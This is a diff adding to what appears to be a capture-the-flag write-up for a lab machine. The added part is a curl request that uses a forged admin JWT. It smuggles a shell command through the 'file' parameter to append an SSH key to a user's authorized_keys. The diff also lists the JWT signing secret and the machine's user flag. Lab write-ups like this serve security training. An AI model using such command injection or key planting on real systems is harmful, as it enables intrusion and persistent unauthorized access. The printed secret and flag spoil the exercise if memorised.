@@ -48,3 +48,18 @@ Bus error (core dumped)
 $ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
 $ strings /tmp/crash-report/CoreDump
 ````
+
+````
+curl -i \
+--get \
+-H 'Host: 10.10.11.120:3000' \
+-H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNzM2NTYzfQ._9whmuv0q2nCEld42Mf3NlvGBXBYpuKPnr9_5MY2TXY' \
+--data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" 'http://10.10.11.120:3000/api/logs'
+````
+
+
+Secrets:
+* TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+* JWT_HEADER = { "alg": "HS256","typ": "JWT"} JWT_PAYLOAD: { "_id": "61d9000566a7e50468a4ae4b","name": "theadmin","email": "root@dasith.works","iat": 1641736563 }
+* FLAG_USER = fbbbc22182e757fe6d1a2668fba16fec
+* FLAG_ROOT = 
